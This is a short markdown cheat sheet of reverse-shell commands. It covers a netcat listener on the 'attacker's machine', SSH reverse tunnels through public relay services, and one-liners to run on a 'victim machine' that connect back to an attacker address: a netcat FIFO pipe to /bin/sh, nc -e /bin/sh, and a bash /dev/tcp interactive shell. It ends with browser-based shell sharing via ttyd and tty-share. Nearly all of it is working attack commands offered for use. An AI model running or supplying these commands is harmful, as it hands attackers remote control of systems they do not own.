# terminal reverse shell

## open listener port on attackers machine
* `nc -v -lp 443`
* macOS `nc -v -l 443`

#### optional - get public address by creating a tcp reverse tunnel
`ssh -R 443:localhost:443 serveo.net`

## reverse connect from victim machine to attackers machine
### bash

* nc
  * with fifo back pipe
    `BACKPIPE=/tmp/backpipe; rm -f $BACKPIPE; mkfifo $BACKPIPE; nc $ATTACKER_ADDRESS $ATTACKER_PORT 0<$BACKPIPE | /bin/sh >$BACKPIPE 2>&1`
  * with `-e` option
    `nc ATTACKER_ADDRESS:ATTACKER_PORT –e /bin/sh`
* bash
  `/bin/bash -c '/bin/bash -i >& /dev/tcp/${0/://} 0>&1' localhost:8000`

# browser reverse shell - ttyd
`docker run --rm -p 8080:7681 tsl0922/ttyd`
`ssh -R 80:localhost:8080 nokey@localhost.run`

# browser reverse shell - tty-share
`docker run --rm -it elisescu/tty-share --public`
